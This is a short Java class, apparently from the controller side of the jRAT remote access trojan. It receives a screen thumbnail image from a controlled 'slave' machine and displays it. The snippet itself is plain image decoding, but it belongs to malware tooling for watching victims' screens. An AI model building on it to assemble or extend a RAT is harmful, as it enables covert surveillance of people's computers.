package se.jrat.client.packets.incoming;

import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.DataInputStream;

import javax.swing.ImageIcon;

import se.jrat.client.Slave;

public class Packet33Thumbnail extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		BufferedImage image = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
		byte[] buffer = ((DataBufferByte) image.getRaster().getDataBuffer()).getData();

		slave.getDataInputStream().readFully(buffer);

		slave.setThumbnail(new ImageIcon(image));
	}

}
